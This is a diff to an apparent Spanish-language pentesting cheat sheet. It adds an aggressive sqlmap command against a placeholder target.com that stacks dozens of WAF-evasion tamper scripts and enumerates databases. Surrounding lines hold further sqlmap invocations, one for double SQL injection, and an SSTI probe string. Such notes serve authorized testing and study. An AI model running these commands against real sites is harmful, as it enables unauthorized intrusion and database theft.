@@ -108,6 +108,11 @@ python3 sqlmap.py --batch --risk 3 --level 5 --technique=BEUSQ --privilege -r ./
 sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5 --> doble inyeccion sql
 
 ```
+### SQLMAP COMMAND
+```
+sqlmap -u "https://target.com" --crawl=3 --level=5 --risk=3 --tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,overlongutf8,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor" --dbs --random-agent --batch --threads=10 --output-dir=InjectionResult --time-sec=10 --retries=3 --flush-session --fresh-queries -v 3
+
+```
 ### SSTI
 ```
 ${{<%[%'"}}%\ probar estos caracteres si da error puede ser suscetible de ssti
